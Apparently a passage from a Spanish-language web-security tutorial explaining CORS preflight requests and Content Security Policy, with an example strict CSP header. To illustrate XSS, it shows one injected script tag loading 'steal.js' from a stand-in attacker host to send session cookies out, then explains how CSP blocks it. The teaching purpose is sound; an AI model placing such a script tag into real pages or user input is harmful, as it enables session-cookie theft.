Mecanismo CORS & Solicitud Preflight (HTTP OPTIONS)

          

            Bajo la Política del Mismo Origen (SOP), el navegador restringe llamadas AJAX hacia dominios distintos. Si la solicitud es "no simple" (ej. método PUT/DELETE o cabecera custom Authorization), el navegador despacha primero una verificación preliminar Preflight vía método OPTIONS.
          


          

            
            
          


          

            
          

        

      


      
      

        

          
Content Security Policy (CSP): Mitigación de XSS

          

            CSP es una cabecera de respuesta HTTP (Content-Security-Policy) que restringe los recursos que el navegador tiene autorización para cargar y ejecutar, neutralizando ataques Cross-Site Scripting (XSS).
          


          

            EJEMPLO DE CABECERA CSP ESTRICTA:

            Content-Security-Policy: default-src 'self';

              script-src 'self' https://trustedscripts.cdn.com;

              connect-src 'self' https://api.servicios.com;

              img-src 'self' data: https:;

              frame-ancestors 'none';
          


          

            

              Sin CSP / CSP Débil:

              Un atacante inyecta <script src="https://evil-hacker.com/steal.js"> en un comentario; el navegador lo descarga y transmite las cookies de sesión del usuario.
            

            

              Con CSP 'self':

              El navegador detecta el script externo, bloquea la conexión hacia evil-hacker.com y emite una advertencia de seguridad en la consola sin comprometer los datos.
